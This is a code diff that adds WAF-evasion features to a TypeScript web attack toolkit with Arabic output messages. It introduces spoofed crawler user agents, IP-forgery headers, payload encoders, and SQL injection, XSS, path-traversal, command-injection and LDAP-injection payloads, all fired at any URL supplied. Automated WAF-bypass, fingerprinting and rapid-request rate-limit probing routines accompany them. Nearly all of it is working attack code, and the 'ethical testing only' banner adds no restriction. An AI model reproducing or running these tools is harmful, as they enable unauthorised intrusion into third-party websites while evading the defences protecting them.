@@ -6,6 +6,94 @@ const corsHeaders = {
   "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
 };
 
+// ===== WAF EVASION HELPERS =====
+
+const USER_AGENTS = [
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+  "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+  "Googlebot/2.1 (+http://www.google.com/bot.html)",
+  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+  "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+];
+
+function randomUA(): string {
+  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
+}
+
+function randomDelay(): Promise<void> {
+  return new Promise(r => setTimeout(r, Math.floor(Math.random() * 500) + 100));
+}
+
+// Stealthy fetch with WAF evasion headers
+async function stealthFetch(url: string, options: RequestInit = {}): Promise<Response> {
+  const headers = new Headers(options.headers || {});
+  if (!headers.has("User-Agent")) headers.set("User-Agent", randomUA());
+  if (!headers.has("Accept")) headers.set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+  if (!headers.has("Accept-Language")) headers.set("Accept-Language", "en-US,en;q=0.9,ar;q=0.8");
+  headers.set("Accept-Encoding", "gzip, deflate");
+  headers.set("Connection", "keep-alive");
+  headers.set("Cache-Control", "no-cache");
+  // Add random referer to look legitimate
+  try { const u = new URL(url); headers.set("Referer", `${u.protocol}//${u.hostname}/`); } catch {}
+  
+  await randomDelay();
+  return fetch(url, { ...options, headers, redirect: options.redirect || "follow" });
+}
+
+// WAF evasion payload encodings
+function wafEncodePayload(payload: string): string[] {
+  return [
+    payload,
+    // Double URL encoding
+    encodeURIComponent(encodeURIComponent(payload)),
+    // Unicode encoding
+    payload.split("").map(c => `%u00${c.charCodeAt(0).toString(16).padStart(2, "0")}`).join(""),
+    // Mixed case
+    payload.split("").map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join(""),
+    // HTML entity encoding
+    payload.replace(/</g, "&lt;").replace(/>/g, "&gt;"),
+    // Tab/newline insertion
+    payload.split("").join("\t"),
+    // Comment insertion (for SQL)
+    payload.replace(/ /g, "/**/"),
+    // Null byte
+    payload + "%00",
+  ];
+}
+
+// Detect WAF block response
+function isWafBlocked(resp: Response, body?: string): { blocked: boolean; wafName: string } {
+  const status = resp.status;
+  const headers = Object.fromEntries(resp.headers.entries());
+  
+  // Status code detection
+  if (status === 403 || status === 406 || status === 429 || status === 503) {
+    // Check specific WAF signatures
+    if (headers["cf-ray"]) return { blocked: true, wafName: "Cloudflare" };
+    if (headers["x-sucuri-id"]) return { blocked: true, wafName: "Sucuri" };
+    if (headers["x-amzn-requestid"]) return { blocked: true, wafName: "AWS WAF" };
+    if (headers["x-iinfo"]) return { blocked: true, wafName: "Imperva" };
+    if (headers["server"]?.toLowerCase().includes("bigip")) return { blocked: true, wafName: "F5 BIG-IP" };
+    if (headers["server"]?.toLowerCase().includes("akamai")) return { blocked: true, wafName: "Akamai" };
+    
+    if (body) {
+      if (body.includes("Cloudflare") || body.includes("cf-browser-verification")) return { blocked: true, wafName: "Cloudflare" };
+      if (body.includes("Sucuri")) return { blocked: true, wafName: "Sucuri" };
+      if (body.includes("ModSecurity") || body.includes("mod_security")) return { blocked: true, wafName: "ModSecurity" };
+      if (body.includes("Wordfence")) return { blocked: true, wafName: "Wordfence" };
+      if (body.includes("Akamai")) return { blocked: true, wafName: "Akamai" };
+      if (body.includes("DDoS protection")) return { blocked: true, wafName: "DDoS Protection" };
+      if (body.includes("Access Denied") || body.includes("Request Blocked")) return { blocked: true, wafName: "Unknown WAF" };
+    }
+    
+    return { blocked: true, wafName: "Unknown" };
+  }
+  return { blocked: false, wafName: "" };
+}
+
 const tools: Record<string, (args: Record<string, string>) => Promise<string>> = {
 
   // ===== SCANNING TOOLS =====
@@ -345,29 +433,54 @@ const tools: Record<string, (args: Record<string, string>) => Promise<string>> =
   async waf_detect(args) {
     const { url } = args;
     if (!url) return "❌ مطلوب: url";
-    const results: string[] = [`🧱 كشف WAF: ${url}\n${"─".repeat(40)}`];
+    const results: string[] = [`🧱 كشف WAF المتقدم: ${url}\n${"─".repeat(40)}`];
     try {
-      const resp = await fetch(url, { redirect: "follow" });
-      await resp.text();
+      const resp = await stealthFetch(url);
+      const body = await resp.text();
       const headers = Object.fromEntries(resp.headers.entries());
-      const wafs: { name: string; detected: boolean }[] = [
-        { name: "Cloudflare", detected: !!headers["cf-ray"] || !!headers["cf-cache-status"] },
-        { name: "AWS WAF", detected: !!headers["x-amzn-requestid"] || !!headers["x-amz-cf-id"] },
-        { name: "Akamai", detected: !!headers["x-akamai-transformed"] },
-        { name: "Sucuri", detected: !!headers["x-sucuri-id"] },
-        { name: "Imperva/Incapsula", detected: !!headers["x-iinfo"] || !!headers["x-cdn"] },
-        { name: "F5 BIG-IP", detected: !!headers["x-cnection"] || !!headers["x-wa-info"] },
-        { name: "ModSecurity", detected: !!headers["server"]?.includes("mod_security") },
+      const wafs: { name: string; detected: boolean; evidence: string }[] = [
+        { name: "Cloudflare", detected: !!headers["cf-ray"] || !!headers["cf-cache-status"] || body.includes("cloudflare"), evidence: headers["cf-ray"] || "cf headers" },
+        { name: "AWS WAF/CloudFront", detected: !!headers["x-amzn-requestid"] || !!headers["x-amz-cf-id"] || !!headers["x-amz-cf-pop"], evidence: "AWS headers" },
+        { name: "Akamai", detected: !!headers["x-akamai-transformed"] || body.includes("akamai"), evidence: "Akamai headers" },
+        { name: "Sucuri", detected: !!headers["x-sucuri-id"] || body.includes("sucuri"), evidence: headers["x-sucuri-id"] || "sucuri" },
+        { name: "Imperva/Incapsula", detected: !!headers["x-iinfo"] || !!headers["x-cdn"] || body.includes("incapsula"), evidence: "Imperva headers" },
+        { name: "F5 BIG-IP", detected: !!headers["x-cnection"] || !!headers["x-wa-info"] || headers["server"]?.toLowerCase().includes("bigip") || false, evidence: "F5 headers" },
+        { name: "ModSecurity", detected: body.includes("ModSecurity") || body.includes("mod_security") || headers["server"]?.includes("mod_security") || false, evidence: "ModSecurity" },
+        { name: "Wordfence", detected: body.includes("wordfence") || body.includes("wfAction"), evidence: "Wordfence" },
+        { name: "DDoS-Guard", detected: !!headers["x-ddos-protection"] || body.includes("ddos-guard"), evidence: "DDoS-Guard" },
+        { name: "Fortinet FortiWeb", detected: !!headers["fortiwafsid"] || body.includes("fortigate"), evidence: "Fortinet" },
+        { name: "Barracuda", detected: !!headers["barra_counter_session"] || body.includes("barracuda"), evidence: "Barracuda" },
       ];
       const detected = wafs.filter(w => w.detected);
-      if (detected.length > 0) { results.push(`\n✅ WAF مكتشف:`); detected.forEach(w => results.push(`  🛡️ ${w.name}`)); }
-      else { results.push(`\nℹ️ لم يتم اكتشاف WAF معروف`); }
-      // Test with malicious payload
-      try {
-        const testResp = await fetch(`${url}/?test=<script>alert(1)</script>`, { redirect: "follow" });
-        if (testResp.status === 403 || testResp.status === 406) { results.push(`\n⚠️ الموقع يحظر الطلبات المشبوهة (${testResp.status})`); }
-        await testResp.text();
-      } catch {}
+      if (detected.length > 0) { 
+        results.push(`\n🛡️ WAF مكتشف (${detected.length}):`); 
+        detected.forEach(w => results.push(`  🔴 ${w.name} (${w.evidence})`)); 
+      } else { 
+        results.push(`\nℹ️ لم يتم اكتشاف WAF معروف من Headers`); 
+      }
+      
+      // Test WAF blocking behavior
+      results.push(`\n📊 اختبار سلوك الحظر:`);
+      const tests = [
+        { name: "XSS Payload", path: "?x=<script>alert(1)</script>" },
+        { name: "SQLi Payload", path: "?x=' OR 1=1--" },
+        { name: "Path Traversal", path: "?x=../../../etc/passwd" },
+      ];
+      for (const test of tests) {
+        try {
+          const testResp = await stealthFetch(`${url}${test.path}`);
+          const testBody = await testResp.text();
+          const waf = isWafBlocked(testResp, testBody);
+          results.push(`  ${waf.blocked ? `🧱 ${test.name}: محظور (${waf.wafName})` : `✅ ${test.name}: مرّ (${testResp.status})`}`);
+        } catch { results.push(`  ❌ ${test.name}: فشل`); }
+      }
+      
+      if (detected.length > 0) {
+        results.push(`\n💡 نصائح التجاوز:`);
+        results.push(`  → استخدم waf_bypass_test لاختبار تقنيات التجاوز`);
+        results.push(`  → استخدم waf_fingerprint لتحليل أعمق`);
+        results.push(`  → استخدم rate_limit_test لمعرفة حدود الطلبات`);
+      }
     } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`); }
     return results.join("\n");
   },
@@ -428,18 +541,36 @@ const tools: Record<string, (args: Record<string, string>) => Promise<string>> =
     const defaultWords = ["admin", "login", "api", "backup", "wp-admin", "wp-login.php", "dashboard", ".env", ".git", "config", "phpmyadmin", "cpanel", "server-status", "robots.txt", "sitemap.xml", ".htaccess", "web.config", "xmlrpc.php", "debug", "test", "staging", "dev", "old", "temp", "uploads"];
     const words = wordlist ? wordlist.split(",").map(w => w.trim()) : defaultWords;
     const baseUrl = url.replace(/\/+$/, "");
-    const results: string[] = [`📂 اكتشاف المجلدات: ${baseUrl}\n${"─".repeat(40)}\n`];
+    const results: string[] = [`📂 اكتشاف المجلدات: ${baseUrl}\n${"─".repeat(40)}\n🕵️ وضع التخفي مفعّل\n`];
     let found = 0;
+    let wafBlocks = 0;
     for (const word of words.slice(0, 30)) {
       try {
-        const resp = await fetch(`${baseUrl}/${word}`, { method: "HEAD", redirect: "manual" });
+        const resp = await stealthFetch(`${baseUrl}/${word}`, { method: "HEAD", redirect: "manual" });
         const status = resp.status;
+        const waf = isWafBlocked(resp);
+        if (waf.blocked) {
+          wafBlocks++;
+          results.push(`  🧱 /${word} → محظور بواسطة ${waf.wafName}`);
+          if (wafBlocks >= 3) {
+            results.push(`\n⚠️ WAF نشط (${waf.wafName})! جاري التبديل لتقنيات التجاوز...`);
+            // Try with different path encoding
+            const encodedWord = word.split("").map(c => `%${c.charCodeAt(0).toString(16)}`).join("");
+            try {
+              const bypassResp = await stealthFetch(`${baseUrl}/${encodedWord}`, { method: "GET", redirect: "manual" });
+              if (bypassResp.status < 400) { results.push(`  🔓 /${word} → ${bypassResp.status} (تجاوز ناجح عبر URL encoding!)`); found++; }
+              await bypassResp.text().catch(() => {});
+            } catch {}
+          }
+          continue;
+        }
         if (status === 200) { results.push(`  ✅ /${word} → ${status} (موجود!)`); found++; }
         else if (status >= 300 && status < 400) { results.push(`  ↪️ /${word} → ${status} (إعادة توجيه)`); found++; }
         else if (status === 403) { results.push(`  🔒 /${word} → ${status} (محظور)`); found++; }
         else if (status === 401) { results.push(`  🔐 /${word} → ${status} (يحتاج مصادقة)`); found++; }
       } catch {}
     }
+    if (wafBlocks > 0) results.push(`\n🧱 WAF حظر ${wafBlocks} طلب`);
     results.push(`\n📊 النتيجة: وُجد ${found} مسار من ${Math.min(words.length, 30)}`);
     return results.join("\n");
   },
@@ -447,45 +578,127 @@ const tools: Record<string, (args: Record<string, string>) => Promise<string>> =
   async sqli_test(args) {
     const { url } = args;
     if (!url) return "❌ مطلوب: url";
-    const results: string[] = [`💉 اختبار SQL Injection\n${"─".repeat(40)}\n🔗 الهدف: ${url}\n⚠️ اختبار أخلاقي فقط!\n`];
+    const results: string[] = [`💉 اختبار SQL Injection (مع تجاوز WAF)\n${"─".repeat(40)}\n🔗 الهدف: ${url}\n⚠️ اختبار أخلاقي فقط!\n`];
+    
+    // Standard payloads
     const payloads = [
-      { name: "Single Quote", payload: "'" }, { name: "OR 1=1", payload: "' OR '1'='1" },
-      { name: "Comment", payload: "' --" }, { name: "Union Select", payload: "' UNION SELECT NULL--" },
+      { name: "Single Quote", payload: "'" },
+      { name: "OR 1=1", payload: "' OR '1'='1" },
+      { name: "Comment", payload: "' --" },
+      { name: "Union Select", payload: "' UNION SELECT NULL--" },
       { name: "Boolean", payload: "' AND '1'='1" },
     ];
+    
+    // WAF bypass payloads
+    const bypassPayloads = [
+      { name: "WAF Bypass: Comment Spaces", payload: "'/**/OR/**/1=1--" },
+      { name: "WAF Bypass: Double Encoding", payload: "%2527%2520OR%25201%253D1--" },
+      { name: "WAF Bypass: Case Mix", payload: "' oR '1'='1" },
+      { name: "WAF Bypass: Inline Comment", payload: "' /*!OR*/ '1'='1" },
+      { name: "WAF Bypass: Tab Instead Space", payload: "'\tOR\t'1'='1" },
+      { name: "WAF Bypass: Null Byte", payload: "%00' OR '1'='1" },
+      { name: "WAF Bypass: Unicode", payload: "＇ OR ＇1＇=＇1" },
+    ];
+    
+    let wafDetected = false;
+    
     for (const { name, payload } of payloads) {
       try {
         const testUrl = url.includes("?") ? url + encodeURIComponent(payload) : url + "?id=" + encodeURIComponent(payload);
-        const resp = await fetch(testUrl, { redirect: "follow" });
+        const resp = await stealthFetch(testUrl);
         const body = await resp.text();
-        const suspicious = body.toLowerCase().includes("sql") || body.toLowerCase().includes("syntax") || body.toLowerCase().includes("mysql") || resp.status === 500;
-        results.push(`  ${suspicious ? "⚠️" : "✅"} ${name}: ${resp.status} ${suspicious ? "(مشبوه!)" : "(آمن)"}`);
+        const waf = isWafBlocked(resp, body);
+        if (waf.blocked) {
+          wafDetected = true;
+          results.push(`  🧱 ${name}: محظور بواسطة ${waf.wafName}`);
+        } else {
+          const suspicious = body.toLowerCase().includes("sql") || body.toLowerCase().includes("syntax") || body.toLowerCase().includes("mysql") || resp.status === 500;
+          results.push(`  ${suspicious ? "⚠️" : "✅"} ${name}: ${resp.status} ${suspicious ? "(مشبوه!)" : "(آمن)"}`);
+        }
       } catch { results.push(`  ❌ ${name}: فشل`); }
     }
+    
+    if (wafDetected) {
+      results.push(`\n🔓 جاري محاولة تجاوز WAF...\n`);
+      for (const { name, payload } of bypassPayloads) {
+        try {
+          const testUrl = url.includes("?") ? url + encodeURIComponent(payload) : url + "?id=" + encodeURIComponent(payload);
+          const resp = await stealthFetch(testUrl);
+          const body = await resp.text();
+          const waf = isWafBlocked(resp, body);
+          if (!waf.blocked) {
+            const suspicious = body.toLowerCase().includes("sql") || body.toLowerCase().includes("syntax") || body.toLowerCase().includes("mysql") || resp.status === 500;
+            results.push(`  ${suspicious ? "⚠️ تجاوز ناجح!" : "✅"} ${name}: ${resp.status} ${suspicious ? "(مشبوه!)" : "(مفلتر)"}`);
+          } else {
+            results.push(`  🧱 ${name}: لا يزال محظوراً`);
+          }
+        } catch { results.push(`  ❌ ${name}: فشل`); }
+      }
+    }
+    
     return results.join("\n");
   },
 
   async xss_test(args) {
     const { url } = args;
     if (!url) return "❌ مطلوب: url";
-    const results: string[] = [`🔥 اختبار XSS\n${"─".repeat(40)}\n🔗 الهدف: ${url}\n⚠️ اختبار أخلاقي فقط!\n`];
+    const results: string[] = [`🔥 اختبار XSS (مع تجاوز WAF)\n${"─".repeat(40)}\n🔗 الهدف: ${url}\n⚠️ اختبار أخلاقي فقط!\n`];
     const payloads = [
       { name: "Basic Script", payload: "<script>alert(1)</script>" },
       { name: "IMG Tag", payload: '<img src=x onerror=alert(1)>' },
       { name: "SVG", payload: '<svg onload=alert(1)>' },
       { name: "Event Handler", payload: '" onmouseover="alert(1)"' },
     ];
+    
+    const bypassPayloads = [
+      { name: "WAF Bypass: Case Mix", payload: "<ScRiPt>alert(1)</sCrIpT>" },
+      { name: "WAF Bypass: Double Encode", payload: "%253Cscript%253Ealert(1)%253C/script%253E" },
+      { name: "WAF Bypass: SVG/onload", payload: "<svg/onload=alert(1)>" },
+      { name: "WAF Bypass: Body onload", payload: "<body onload=alert(1)>" },
+      { name: "WAF Bypass: IMG with tab", payload: "<img\tsrc=x\tonerror=alert(1)>" },
+      { name: "WAF Bypass: JavaScript URI", payload: "javascript:alert(1)//" },
+      { name: "WAF Bypass: HTML Entity", payload: "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>" },
+      { name: "WAF Bypass: Null Byte", payload: "<scr%00ipt>alert(1)</scr%00ipt>" },
+    ];
+    
+    let wafDetected = false;
+    
     for (const { name, payload } of payloads) {
       try {
         const testUrl = url.includes("?") ? url + encodeURIComponent(payload) : url + "?q=" + encodeURIComponent(payload);
-        const resp = await fetch(testUrl, { redirect: "follow" });
+        const resp = await stealthFetch(testUrl);
         const body = await resp.text();
-        const reflected = body.includes(payload);
-        results.push(`  ${reflected ? "⚠️" : "✅"} ${name}: ${reflected ? "منعكس!" : "مفلتر"}`);
+        const waf = isWafBlocked(resp, body);
+        if (waf.blocked) {
+          wafDetected = true;
+          results.push(`  🧱 ${name}: محظور بواسطة ${waf.wafName}`);
+        } else {
+          const reflected = body.includes(payload);
+          results.push(`  ${reflected ? "⚠️" : "✅"} ${name}: ${reflected ? "منعكس!" : "مفلتر"}`);
+        }
       } catch { results.push(`  ❌ ${name}: فشل`); }
     }
+    
+    if (wafDetected) {
+      results.push(`\n🔓 جاري محاولة تجاوز WAF...\n`);
+      for (const { name, payload } of bypassPayloads) {
+        try {
+          const testUrl = url.includes("?") ? url + encodeURIComponent(payload) : url + "?q=" + encodeURIComponent(payload);
+          const resp = await stealthFetch(testUrl);
+          const body = await resp.text();
+          const waf = isWafBlocked(resp, body);
+          if (!waf.blocked) {
+            const reflected = body.includes(payload) || body.includes(decodeURIComponent(payload));
+            results.push(`  ${reflected ? "⚠️ تجاوز ناجح!" : "✅"} ${name}: ${reflected ? "منعكس!" : "مفلتر"}`);
+          } else {
+            results.push(`  🧱 ${name}: لا يزال محظوراً`);
+          }
+        } catch { results.push(`  ❌ ${name}: فشل`); }
+      }
+    }
+    
     try {
-      const resp = await fetch(url, { method: "HEAD" });
+      const resp = await stealthFetch(url, { method: "HEAD" });
       results.push(`\n🛡️ حماية:`);
       results.push(`  ${resp.headers.get("content-security-policy") ? "✅" : "❌"} CSP`);
       results.push(`  ${resp.headers.get("x-xss-protection") ? "✅" : "❌"} X-XSS-Protection`);
@@ -1071,6 +1284,203 @@ const tools: Record<string, (args: Record<string, string>) => Promise<string>> =
     } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`); }
     return results.join("\n");
   },
+};
+
+// ===== WAF BYPASS TOOLS =====
+
+tools.waf_bypass_test = async (args) => {
+  const { url } = args;
+  if (!url) return "❌ مطلوب: url";
+  const results: string[] = [`🔓 اختبار تجاوز WAF الشامل: ${url}\n${"─".repeat(40)}\n`];
+
+  // Step 1: Identify WAF
+  results.push("📌 الخطوة 1: تحديد نوع WAF...\n");
+  let detectedWaf = "Unknown";
+  try {
+    const normalResp = await stealthFetch(url);
+    await normalResp.text();
+    const headers = Object.fromEntries(normalResp.headers.entries());
+    if (headers["cf-ray"]) detectedWaf = "Cloudflare";
+    else if (headers["x-sucuri-id"]) detectedWaf = "Sucuri";
+    else if (headers["x-amzn-requestid"]) detectedWaf = "AWS WAF";
+    else if (headers["x-iinfo"]) detectedWaf = "Imperva";
+    else if (headers["server"]?.toLowerCase().includes("bigip")) detectedWaf = "F5 BIG-IP";
+    
+    // Trigger WAF with malicious payload
+    const triggerResp = await stealthFetch(`${url}?test=<script>alert(1)</script>&id=' OR 1=1--`);
+    const triggerBody = await triggerResp.text();
+    const waf = isWafBlocked(triggerResp, triggerBody);
+    if (waf.blocked) detectedWaf = waf.wafName;
+    results.push(`🧱 WAF مكتشف: ${detectedWaf}\n`);
+  } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}\n`); }
+
+  // Step 2: Test bypass techniques
+  results.push("📌 الخطوة 2: اختبار تقنيات التجاوز...\n");
+  const techniques = [
+    { name: "User-Agent: Googlebot", headers: { "User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)" } },
+    { name: "User-Agent: Mobile", headers: { "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)" } },
+    { name: "X-Forwarded-For: 127.0.0.1", headers: { "X-Forwarded-For": "127.0.0.1" } },
+    { name: "X-Originating-IP: 127.0.0.1", headers: { "X-Originating-IP": "127.0.0.1" } },
+    { name: "X-Real-IP: 127.0.0.1", headers: { "X-Real-IP": "127.0.0.1" } },
+    { name: "X-Custom-IP: 127.0.0.1", headers: { "X-Custom-IP-Authorization": "127.0.0.1" } },
+    { name: "Content-Type: multipart", headers: { "Content-Type": "multipart/form-data" } },
+    { name: "Accept: application/json", headers: { "Accept": "application/json" } },
+  ];
+
+  const maliciousPath = "?id=' OR 1=1--";
+  for (const tech of techniques) {
+    try {
+      const resp = await fetch(`${url}${maliciousPath}`, { 
+        headers: { ...tech.headers, "Accept-Language": "en-US", "Connection": "keep-alive" },
+        redirect: "follow" 
+      });
+      const body = await resp.text();
+      const waf = isWafBlocked(resp, body);
+      results.push(`  ${waf.blocked ? "🧱" : "🔓"} ${tech.name}: ${resp.status} ${waf.blocked ? "(محظور)" : "(مرور!)"}`);
+    } catch { results.push(`  ❌ ${tech.name}: فشل`); }
+  }
+
+  // Step 3: URL encoding techniques
+  results.push("\n📌 الخطوة 3: تقنيات ترميز URL...\n");
+  const encodings = [
+    { name: "Double URL Encode", path: "?id=%2527%2520OR%25201%253D1--" },
+    { name: "Unicode Encode", path: "?id=%u0027%u0020OR%u00201%u003D1--" },
+    { name: "Hex Encode", path: "?id=0x27%20OR%201=1--" },
+    { name: "Tab Separation", path: "?id='\tOR\t1=1--" },
+    { name: "Comment Insertion", path: "?id='/**/OR/**/1=1--" },
+    { name: "Null Byte", path: "?id=%00' OR 1=1--" },
+    { name: "Newline", path: "?id=%0a' OR 1=1--" },
+    { name: "HTTP Parameter Pollution", path: "?id=1&id=' OR 1=1--" },
+  ];
+
+  for (const enc of encodings) {
+    try {
+      const resp = await stealthFetch(`${url}${enc.path}`);
+      const body = await resp.text();
+      const waf = isWafBlocked(resp, body);
+      results.push(`  ${waf.blocked ? "🧱" : "🔓"} ${enc.name}: ${resp.status} ${waf.blocked ? "(محظور)" : "(مرور!)"}`);
+    } catch { results.push(`  ❌ ${enc.name}: فشل`); }
+  }
+
+  // Step 4: HTTP method switching
+  results.push("\n📌 الخطوة 4: تبديل HTTP Methods...\n");
+  for (const method of ["GET", "POST", "PUT", "PATCH"]) {
+    try {
+      const resp = await stealthFetch(`${url}${maliciousPath}`, { method });
+      const body = await resp.text();
+      const waf = isWafBlocked(resp, body);
+      results.push(`  ${waf.blocked ? "🧱" : "🔓"} ${method}: ${resp.status} ${waf.blocked ? "(محظور)" : "(مرور!)"}`);
+    } catch { results.push(`  ❌ ${method}: فشل`); }
+  }
+
+  return results.join("\n");
+};
+
+tools.waf_fingerprint = async (args) => {
+  const { url } = args;
+  if (!url) return "❌ مطلوب: url";
+  const results: string[] = [`🔍 بصمة WAF التفصيلية: ${url}\n${"─".repeat(40)}\n`];
+
+  // Normal request
+  try {
+    const resp = await stealthFetch(url);
+    const body = await resp.text();
+    const headers = Object.fromEntries(resp.headers.entries());
+    
+    results.push("📋 Headers المكتشفة:");
+    for (const [k, v] of Object.entries(headers)) {
+      results.push(`  ${k}: ${v.slice(0, 100)}`);
+    }
+    
+    // WAF signatures database
+    const signatures = [
+      { name: "Cloudflare", checks: [!!headers["cf-ray"], !!headers["cf-cache-status"], body.includes("cloudflare"), !!headers["cf-connecting-ip"]] },
+      { name: "AWS WAF/CloudFront", checks: [!!headers["x-amz-cf-id"], !!headers["x-amzn-requestid"], !!headers["x-amz-cf-pop"]] },
+      { name: "Akamai", checks: [!!headers["x-akamai-transformed"], !!headers["akamai-origin-hop"], body.includes("akamai")] },
+      { name: "Sucuri", checks: [!!headers["x-sucuri-id"], !!headers["x-sucuri-cache"], body.includes("sucuri")] },
+      { name: "Imperva/Incapsula", checks: [!!headers["x-iinfo"], !!headers["x-cdn"], body.includes("incapsula")] },
+      { name: "F5 BIG-IP", checks: [!!headers["x-cnection"], !!headers["x-wa-info"], headers["server"]?.includes("BigIP") || false] },
+      { name: "ModSecurity", checks: [body.includes("ModSecurity"), body.includes("mod_security"), headers["server"]?.includes("mod_security") || false] },
+      { name: "Wordfence", checks: [body.includes("wordfence"), body.includes("wfAction")] },
+      { name: "Fortinet FortiWeb", checks: [!!headers["fortiwafsid"], body.includes("fortigate")] },
+      { name: "Barracuda", checks: [!!headers["barra_counter_session"], body.includes("barracuda")] },
+      { name: "DDoS-Guard", checks: [!!headers["x-ddos-protection"], body.includes("ddos-guard")] },
+      { name: "StackPath", checks: [!!headers["x-sp-url"], body.includes("stackpath")] },
+    ];
+    
+    results.push("\n🧱 نتائج الفحص:");
+    let detectedCount = 0;
+    for (const sig of signatures) {
+      const matchCount = sig.checks.filter(Boolean).length;
+      if (matchCount > 0) {
+        results.push(`  🔴 ${sig.name}: ${matchCount}/${sig.checks.length} مؤشرات`);
+        detectedCount++;
+      }
+    }
+    
+    if (detectedCount === 0) {
+      results.push("  ✅ لم يتم اكتشاف WAF معروف");
+    }
+    
+    // Test WAF sensitivity
+    results.push("\n📊 اختبار حساسية WAF:");
+    const sensitivityTests = [
+      { name: "XSS بسيط", path: "?x=<script>" },
+      { name: "SQLi بسيط", path: "?x=' OR 1=1" },
+      { name: "Path Traversal", path: "?x=../../../etc/passwd" },
+      { name: "Command Injection", path: "?x=;ls -la" },
+      { name: "LDAP Injection", path: "?x=*)(uid=*))(|(uid=*" },
+    ];
+    
+    for (const test of sensitivityTests) {
+      try {
+        const testResp = await stealthFetch(`${url}${test.path}`);
+        const testBody = await testResp.text();
+        const waf = isWafBlocked(testResp, testBody);
+        results.push(`  ${waf.blocked ? "🧱 محظور" : "🔓 مرّ"} ${test.name} → ${testResp.status}`);
+      } catch { results.push(`  ❌ ${test.name}: فشل`); }
+    }
+
+  } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`); }
+  return results.join("\n");
+};
+
+tools.rate_limit_test = async (args) => {
+  const { url } = args;
+  if (!url) return "❌ مطلوب: url";
+  const results: string[] = [`⏱️ اختبار Rate Limiting: ${url}\n${"─".repeat(40)}\n`];
+  
+  const requestCounts = [5, 10, 20];
+  for (const count of requestCounts) {
+    results.push(`\n📡 إرسال ${count} طلبات سريعة...`);
+    let blocked = 0;
+    let passed = 0;
+    const statuses: number[] = [];
+    
+    const promises = Array.from({ length: count }, () => 
+      fetch(url, { headers: { "User-Agent": randomUA() }, redirect: "follow" })
+        .then(async r => { 
+          statuses.push(r.status); 
+          await r.text();
+          if (r.status === 429 || r.status === 503) blocked++;
+          else passed++;
+        })
+        .catch(() => { blocked++; })
+    );
+    
+    await Promise.all(promises);
+    
+    const statusCounts = statuses.reduce((acc, s) => { acc[s] = (acc[s] || 0) + 1; return acc; }, {} as Record<number, number>);
+    results.push(`  ✅ مرّ: ${passed} | 🧱 محظور: ${blocked}`);
+    results.push(`  📊 الحالات: ${Object.entries(statusCounts).map(([s, c]) => `${s}(${c})`).join(", ")}`);
+    
+    if (blocked > 0) {
+      results.push(`  ⚠️ Rate limiting مفعّل عند ~${passed} طلب`);
+      break;
+    }
+  }
+  
+  return results.join("\n");
 };
 
 // Custom tool execution handler
